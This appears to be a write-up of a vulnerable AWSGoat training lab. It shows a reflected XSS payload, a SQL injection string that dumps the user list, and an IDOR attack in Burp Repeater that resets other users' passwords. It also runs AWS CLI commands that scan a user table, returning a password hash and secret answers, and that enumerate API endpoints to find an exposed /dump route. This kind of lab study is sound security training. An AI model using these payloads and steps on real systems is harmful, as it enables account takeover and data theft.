# Vulnerabilities Exploited

### Reflected XSS

On Home Page search bar type: <img src="A" onerror=alert('XSS')>  

![Screenshot_2023-10-12_10_40_55](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/60b9e024-8a18-41f2-bba5-a3a2a4ccc517)

### SQL Injection

Once you logged in go to Dashboard > Users, and type    ' or '1'='1'    
And it will retrieve all users.  

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/8e31bb32-6dbc-4e1b-9421-5172e3c14e26)

### Insecure Direct Object Reference

If we go and change our password and open the Inspect Tools we can see that an id is being passed:

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/e7111cd7-3500-404e-acea-544ed331a82d)

This means that we may be able to change the other users passwords. For this let's go to Burp Suite, open the explorer and when we get to this form on the dashboard we'll send the request to the Repeater:  
For this go to Burp Suite > Proxy > Open Browser (keep the intercept off until you're in the same form) > Turn on Interception.  
Change the password (example: ola2) and click the button change password.   
Forward the first request that comes up and now click on the request with the right button and send it to repeater:  

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/51086602-5c02-4688-803b-33d0c3af725c)

Once you're in the repeater change the ID field to an id from 1-7 which are the other users, and then forward the request:  

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/c5599bcf-bfeb-4c1d-81fa-ad22f3d7db56)

Now that we've changed successfully a password we have 2 options.  
1st: try all possible users since they aren't many and eventually we'll find out who is id 1  
2nd: list all users with the command:  
````
aws dynamodb scan --table-name blog-users --region us-east-1
````
and it will return all the information of the users, including this:

````
{
            "secretQuestion": {
                "S": "What is your favourite sport?"
            },
            "creationDate": {
                "S": "2022-01-25T00:00:00.000Z"
            },
            "address": {
                "S": "Ap #662-2304 Phasellus Ave"
            },
            "secretAnswer": {
                "S": "Football"
            },
            "email": {
                "S": "dolor.fusce@aol.ca"
            },
            "country": {
                "S": "Germany"
            },
            "name": {
                "S": "Naida Dotson"
            },
            "authLevel": {
                "S": "0"
            },
            "password": {
                "S": "$2a$10$ru0QWFM7BFe.e470jT1sz.iMGxjUOrXyyClc9301mcw.fEbcUk/Ta"
            },
            "username": {
                "S": "naidadotson"
            },
            "id": {
                "S": "1"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "329938731"
            }
        }
````

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/00623430-9280-4119-aea7-20c0ab0b8f80)

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/91fbedd9-bafb-42c7-8c06-d9a07d8d08e4)


### Sensitive Data Exposure 

````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ aws apigateway get-resources --rest-api-id uklmns71xk --region us-east-1
{
    "items": [
        {
            "id": "09tmbm",
            "parentId": "sdtw1na2qa",
            "pathPart": "login",
            "path": "/login",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "1z2wgh",
            "parentId": "sdtw1na2qa",
            "pathPart": "ban-user",
            "path": "/ban-user",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "2okpqe",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-profile",
            "path": "/change-profile",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "36qlrh",
            "parentId": "sdtw1na2qa",
            "pathPart": "unban-user",
            "path": "/unban-user",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "3ze9li",
            "parentId": "sdtw1na2qa",
            "pathPart": "register",
            "path": "/register",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "4dc0f6",
            "parentId": "sdtw1na2qa",
            "pathPart": "search-author",
            "path": "/search-author",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5rqhcw",
            "parentId": "sdtw1na2qa",
            "pathPart": "xss",
            "path": "/xss",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5v5vi2",
            "parentId": "sdtw1na2qa",
            "pathPart": "list-posts",
            "path": "/list-posts",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5y7rs1",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-auth",
            "path": "/change-auth",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "6kab1r",
            "parentId": "sdtw1na2qa",
            "pathPart": "user-details-modal",
            "path": "/user-details-modal",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "b9rfza",
            "parentId": "sdtw1na2qa",
            "pathPart": "dump",
            "path": "/dump",
            "resourceMethods": {
                "GET": {},
                "OPTIONS": {}
            }
        },
````

If we look carefully we find a GET Method in the API called /dump, so let's search for it and see what does it contain:  
https://uklmns71xk.execute-api.us-east-1.amazonaws.com/dump  
If we search for this we will get a Forbidden error, but we know that this endpoint is accessible, and with a little search we can see some common paths for the api, one of them being /v1 or /v2: https://stackoverflow.com/questions/72339224/aws-v1-vs-v2-api-for-listing-apis-on-aws-api-gateway-return-different-data-for-t     

![image](https://github.com/lourenco00/AWSGoat-Walkthrough/assets/91602746/ad819058-567d-40d2-b83b-9c54313f9267)
